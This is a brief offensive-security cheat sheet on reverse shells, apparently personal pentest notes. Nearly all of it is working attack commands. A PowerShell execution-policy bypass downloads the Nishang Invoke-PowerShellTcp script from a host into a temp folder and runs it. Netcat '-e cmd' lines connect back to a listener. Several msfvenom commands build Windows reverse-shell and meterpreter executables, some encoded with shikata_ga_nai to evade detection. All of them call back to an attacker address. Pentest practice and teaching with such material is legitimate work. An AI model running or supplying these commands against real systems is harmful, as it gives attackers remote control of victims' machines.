# Reverse Shells

### Nishang

[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Add line to ending:&#x20;

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.1 -Port 80

```
cmd.exe /c powershell.exe -ep bypass Invoke-WebRequest -Uri 'http://192.168.1.1/Invoke-PowerShellTcp.ps1' -OutFile 'C:\Windows\Temp\s.ps1'

cmd.exe /c powershell.exe -ep bypass -File C:\Windows\Temp\s.ps1"
```

### Netcat

```
nc -e {shell} {LHOST} {LPORT}
nc.exe -e cmd 192.168.1.1 80
```

### MSFVENOM

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f exe -o shell.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -e x86/shikata_ga_nai -f exe -o shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f exe -o shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -e x86/shikata_ga_nai -f exe -o shell.exe

msfvenom -p windows/meterpreter/reverse_tcp 192.168.1.1 80 -e x86/shikata_ga_nai -i 8 -f exe -o shell.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp 192.168.1.1 80 -e x86/shikata_ga_nai -i 8 -f exe -o shell.exe
```
